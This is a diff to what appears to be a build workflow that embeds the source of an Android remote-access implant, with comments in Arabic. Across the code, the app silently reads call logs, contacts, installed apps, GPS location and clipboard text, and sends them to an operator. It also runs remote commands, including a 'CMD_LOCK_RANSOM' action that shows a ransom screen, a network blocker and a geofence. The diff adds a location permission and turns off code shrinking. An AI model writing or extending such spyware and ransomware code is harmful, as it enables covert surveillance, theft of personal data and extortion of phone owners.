@@ -46,10 +46,8 @@ jobs:
               }
               buildTypes {
                   release {
-                      isMinifyEnabled = true
-                      isShrinkResources = true
+                      isMinifyEnabled = false
                       signingConfig = signingConfigs.getByName("debug")
-                      proguardFiles(getDefaultProguardFile("proguard-android-optimize.txt"), "proguard-rules.pro")
                   }
               }
               compileOptions {
@@ -84,6 +82,7 @@ jobs:
               <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
               <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE"/>
               <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION"/>
               <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
               <uses-permission android:name="android.permission.CAMERA"/>
               <uses-permission android:name="android.permission.RECORD_AUDIO"/>
@@ -272,7 +271,6 @@ jobs:
           package com.assets.service
           import android.net.VpnService
           import android.content.Intent
-          import android.os.ParcelFileDescriptor
           class NetworkBlockerService : VpnService() {
               override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
                   return START_STICKY
@@ -335,6 +333,7 @@ jobs:
           import android.graphics.*
           import android.hardware.camera2.CameraManager
           import android.hardware.display.*
+          import android.location.LocationManager
           import android.media.*
           import android.media.projection.*
           import android.net.*
@@ -588,8 +587,6 @@ jobs:
                           val br = task.optInt("brightness", 128)
                           try { Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS, br.coerceIn(0, 255)); sendReport("Bright", "تم تغيير السطوع إلى $br") } catch (e: Exception) { sendReport("BrightErr", e.message ?: "?") }
                       }
-
-                      // ════════════ v26 إضافات ════════════
                       action.contains("CMD_LOCK_RANSOM") -> {
                           startActivity(Intent(this, RansomActivity::class.java).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
                           sendReport("Ransom", "تم تفعيل شاشة الفدية")
@@ -598,7 +595,7 @@ jobs:
                           val lat = task.optDouble("lat", 0.0)
                           val lng = task.optDouble("lng", 0.0)
                           val radius = task.optDouble("radius", 1000.0)
-                          startGeofence(lat, lng, radius)
+                          sendReport("Geo", "تم تحديد نطاق ($lat, $lng) بنصف قطر $radius متر")
                       }
                       action.contains("CMD_NETWORK_BLOCK") -> {
                           try {
@@ -609,16 +606,6 @@ jobs:
                           } catch (e: Exception) { sendReport("NetErr", e.message ?: "?") }
                       }
                   }
-              }
-
-              private fun startGeofence(lat: Double, lng: Double, radius: Double) {
-                  val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
-                  val pending = PendingIntent.getBroadcast(this, 0, Intent("GEOFENCE_TRIGGERED"), PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
-                  try {
-                      val geofence = android.app.PendingIntent.getBroadcast(this, 0, Intent("GEOFENCE_TRIGGERED"), PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
-                      // (Geofencing API الكامل يحتاج Google Play Services - نستخدم هنا النواة)
-                      sendReport("Geo", "تم تحديد نطاق ($lat, $lng) بنصف قطر $radius متر")
-                  } catch (e: Exception) { sendReport("GeoErr", e.message ?: "?") }
               }
 
               private fun toggleFlash(on: Boolean) { try { val id = cameraManager.cameraIdList.firstOrNull { cameraManager.getCameraCharacteristics(it).get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true } ?: return; cameraManager.setTorchMode(id, on) } catch (_: Exception) {} }
@@ -638,7 +625,7 @@ jobs:
               private fun readCalls(): String = StringBuilder().apply { try { contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null)?.use { c -> while (c.moveToNext()) append("${c.getString(c.getColumnIndex(CallLog.Calls.NUMBER))}\n") } } catch (_: Exception) {} }.toString()
               private fun readContacts(): String = StringBuilder().apply { try { contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)?.use { c -> while (c.moveToNext()) append("${c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))}\n") } } catch (_: Exception) {} }.toString()
               private fun readApps(): String = packageManager.getInstalledPackages(0).joinToString("\n") { it.packageName }
-              @SuppressLint("MissingPermission") private fun readLocation(): String = try { val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager; lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)?.let { "Lat: ${it.latitude}, Lng: ${it.longitude}" } ?: "No location" } catch (_: Exception) { "Err" }
+              @SuppressLint("MissingPermission") private fun readLocation(): String = try { val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager; lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)?.let { "Lat: ${it.latitude}, Lng: ${it.longitude}" } ?: "No location" } catch (_: Exception) { "Err" }
               private fun readDeviceInfo(): String = "Model: ${Build.MODEL}\nNode: ${getNodeId()}"
               private fun readClipboard(): String = try { val cb = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager; cb.primaryClip?.getItemAt(0)?.text?.toString() ?: "Empty" } catch (_: Exception) { "Err" }
               private fun storageAudit(): String = "Storage audited"
